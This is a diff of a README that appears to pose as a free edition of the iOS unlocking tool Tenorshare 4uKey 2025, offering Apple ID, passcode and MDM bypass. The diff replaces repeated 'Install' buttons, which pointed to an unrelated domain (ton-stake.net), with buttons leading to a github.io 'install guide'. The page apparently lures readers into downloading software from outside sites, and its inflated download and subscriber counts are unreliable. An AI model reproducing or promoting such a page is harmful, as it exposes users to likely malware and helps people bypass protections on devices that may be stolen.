@@ -5,7 +5,9 @@
 
 **Description**: Unlock your iOS devices with **Tenorshare 4uKey 2025**! This repository provides comprehensive tutorials, guides, and resources for the free version, enabling you to bypass screen passcodes, Apple IDs, and MDM restrictions on iPhone 16, iPad Pro, and other models running iOS 18. Join our community with 110K+ downloads and 70K+ subscribers to master iPhone unlocking in 2025!  
 
-[![Install Tenorshare 4uKey](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://free-4ukey-iphone-community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -33,7 +35,9 @@ Begin your unlocking journey with Tenorshare 4uKey 2025 using these simple steps
 6. **Troubleshooting** ❓  
    If download issues occur, disable your VPN, check your internet, or try browsers like Chrome, Firefox, or Edge.  
 
-[![Install Tenorshare 4uKey](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://free-4ukey-iphone-community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -46,7 +50,9 @@ Begin your unlocking journey with Tenorshare 4uKey 2025 using these simple steps
 - 🌍 **Active Community**: Backed by 110K+ downloads and 70K+ subscribers.  
 - 📅 **2025 Updates**: Stay current with the latest iOS unlocking features.  
 
-[![Install Tenorshare 4uKey](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://free-4ukey-iphone-community.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -63,8 +69,6 @@ Begin your unlocking journey with Tenorshare 4uKey 2025 using these simple steps
 - 📱 **Apple ID Removal**: Bypass Apple ID without a password.  
 - 🛠 **MDM Bypass**: Remove Mobile Device Management restrictions.  
 - 📚 **Skill Building**: Learn advanced unlocking techniques from 70K+ subscribers.  
-
-[![Install Tenorshare 4uKey](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
 
 ---
 
